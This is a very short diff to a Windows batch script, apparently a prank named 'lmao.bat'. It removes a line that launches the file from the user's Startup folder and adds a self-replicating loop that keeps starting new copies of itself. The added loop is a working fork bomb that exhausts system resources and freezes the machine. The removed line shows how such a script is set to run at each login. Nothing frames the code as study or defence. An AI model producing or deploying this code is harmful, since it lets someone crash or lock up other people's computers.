@@ -1,1 +1,3 @@
-start "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\lmao.bat"
+:s
+start %0
+goto s
